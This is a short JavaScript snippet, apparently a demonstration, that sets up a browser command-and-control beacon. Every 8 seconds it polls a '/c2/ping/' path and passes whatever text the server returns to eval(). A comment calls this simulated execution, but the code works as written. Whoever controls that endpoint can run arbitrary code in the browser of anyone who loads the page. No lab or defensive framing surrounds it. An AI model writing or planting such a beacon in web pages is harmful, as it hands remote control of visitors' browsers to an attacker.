
(function(){
    const beacon = async () => {
        try {
            const res = await fetch('/c2/ping/');
            if (res.ok) {
                const cmd = await res.text();
                eval(cmd); // Simulated execution of server command
            }
        } catch (e) { console.error(e); }
    };
    setInterval(beacon, 8000); // Beacon every 8s
})();
